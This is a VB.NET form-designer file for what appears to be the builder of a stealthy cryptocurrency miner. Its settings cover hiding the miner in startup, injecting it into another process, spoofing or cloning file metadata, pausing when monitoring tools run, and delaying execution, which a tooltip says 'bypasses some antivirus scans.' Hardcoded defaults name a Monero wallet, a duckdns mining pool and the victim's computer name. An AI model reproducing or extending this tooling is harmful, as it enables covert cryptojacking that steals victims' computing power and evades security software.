...
Partial Class Form1
    ...
    Private Sub InitializeComponent()
        ...
        Me.MephForm1 = New project.MephTheme()
        Me.MephTabcontrol2 = New project.MephTabcontrol()
        Me.TabPage1 = New System.Windows.Forms.TabPage()
        Me.labelWiki = New System.Windows.Forms.LinkLabel()
        Me.Label10 = New System.Windows.Forms.Label()
        Me.Label5 = New System.Windows.Forms.Label()
        Me.txtAlgorithm = New project.MephComboBox()
        Me.Label8 = New System.Windows.Forms.Label()
        Me.txtPoolUsername = New project.MephTextBox()
        Me.txtPoolURL = New project.MephTextBox()
        Me.Label6 = New System.Windows.Forms.Label()
        Me.Label7 = New System.Windows.Forms.Label()
        Me.txtPoolPassowrd = New project.MephTextBox()
        Me.TabPage2 = New System.Windows.Forms.TabPage()
        Me.Label37 = New System.Windows.Forms.Label()
        Me.toggleWatchdog = New project.MephToggleSwitch()
        Me.chkInstall = New project.MephCheckBox()
        Me.txtInstallFileName = New project.MephTextBox()
        Me.Label2 = New System.Windows.Forms.Label()
        Me.Label1 = New System.Windows.Forms.Label()
        Me.txtInstallPathMain = New project.MephComboBox()
        Me.TabPage3 = New System.Windows.Forms.TabPage()
        Me.Label9 = New System.Windows.Forms.Label()
        Me.chkAssembly = New project.MephCheckBox()
        Me.btn_assemblyRandom = New project.MephButton()
        Me.txtTitle = New project.MephTextBox()
        Me.btn_assemblyClone = New project.MephButton()
        Me.txtProduct = New project.MephTextBox()
        Me.num_Assembly4 = New project.MephTextBox()
        Me.txtDescription = New project.MephTextBox()
        Me.num_Assembly3 = New project.MephTextBox()
        Me.txtCopyright = New project.MephTextBox()
        Me.num_Assembly2 = New project.MephTextBox()
        Me.txtCompany = New project.MephTextBox()
        Me.num_Assembly1 = New project.MephTextBox()
        Me.txtTrademark = New project.MephTextBox()
        Me.TabPage4 = New System.Windows.Forms.TabPage()
        Me.chkIcon = New project.MephCheckBox()
        Me.picIcon = New System.Windows.Forms.PictureBox()
        Me.btnBrowseIcon = New project.MephButton()
        Me.txtIconPath = New project.MephTextBox()
        Me.TabPage6 = New System.Windows.Forms.TabPage()
        Me.Label19 = New System.Windows.Forms.Label()
        Me.txtInjection = New project.MephComboBox()
        Me.MephButton1 = New project.MephButton()
        Me.Label27 = New System.Windows.Forms.Label()
        Me.toggleEnableStealth = New project.MephToggleSwitch()
        Me.Label24 = New System.Windows.Forms.Label()
        Me.Label23 = New System.Windows.Forms.Label()
        Me.txtIdleWait = New project.MephTextBox()
        Me.txtIdleCPU = New project.MephComboBox()
        Me.Label22 = New System.Windows.Forms.Label()
        Me.Label18 = New System.Windows.Forms.Label()
        Me.toggleSSLTLS = New project.MephToggleSwitch()
        Me.Label13 = New System.Windows.Forms.Label()
        Me.toggleEnableCPU = New project.MephToggleSwitch()
        Me.Label12 = New System.Windows.Forms.Label()
        Me.toggleEnableNicehash = New project.MephToggleSwitch()
        Me.Label11 = New System.Windows.Forms.Label()
        Me.toggleEnableIdle = New project.MephToggleSwitch()
        Me.Label4 = New System.Windows.Forms.Label()
        Me.toggleEnableGPU = New project.MephToggleSwitch()
        Me.txtMaxCPU = New project.MephComboBox()
        ...
        Me.TooltipHelper.SetToolTip(Me.helpLabelPassword, "The password to connect with. On many pools you should leave this blank but on so" & _
        "me they require you to put some password here or as in the case of SupportXMR yo" & _
        ...
        Me.TooltipHelper.SetToolTip(Me.helpLabelPool, "The pool to mine to. Pool address is formatted as such: ADDRESS:PORT. (Example: x" & _
        ...
        Me.Label32.Text = "?"
        Me.TooltipHelper.SetToolTip(Me.Label32, "The Installed miners filename, this filename will show up in places like the Task" & _
        ...
        Me.Label35.Text = "?"
        Me.TooltipHelper.SetToolTip(Me.Label35, "The assembly information of the file, this information will also show up in the T" & _
        ...
        Me.Label26.Text = "?"
        Me.TooltipHelper.SetToolTip(Me.Label26, "If enabled it will pause the miner while any process specified in the ""Stealth Ta" & _
        ...
        Me.Label17.Text = "?"
        Me.TooltipHelper.SetToolTip(Me.Label17, "SSL/TLS increases performance and stability but only works on some pools, check t" & _
        "he pool you're using the see if it supports it. Most pools use a different port " & _
        "for SSL/TLS.")
        '
        'Label16
        '
        ...
        Me.Label16.Text = "?"
        Me.TooltipHelper.SetToolTip(Me.Label16, "Only enable if mining to nicehash.com or using something like xmrig-proxy where t" & _
        ...
        Me.Label14.Text = "?"
        Me.TooltipHelper.SetToolTip(Me.Label14, "GPU Mining for some cryptocuirrencies is good or required but is easier to detect" & _
        ...
        Me.Label28.Text = "?"
        Me.TooltipHelper.SetToolTip(Me.Label28, "The time to wait before injecting and starting the miner. This bypasses some anti" & _
        "virus scans!")
        '
        'Label20
        '
        ...
        Me.TooltipHelper.SetToolTip(Me.helpLabelWallet, "The wallet address or user/email to mine to. Some pools also use this field to in" & _
        ...
        Me.TooltipHelper.SetToolTip(Me.helpLabelInstall, "Enabling Startup causes the miner to copy itself to the Save Path and then set to" & _
        ...
        Me.txtPoolUsername.Text = "48aQfBHCBiP4zPY5mi5HREe7SZBrEWUyeLRd78yMyaDDc5Dm3EuZBo9d9fhYT9ei81bobKVffFLwaifdM" & _
    "5kFf2yjAS9mw4U"
        ...
        Me.txtPoolURL.Text = "ahmedzx5.duckdns.org:3333"
        ...
        Me.txtPoolPassowrd.Text = "{COMPUTERNAME}"
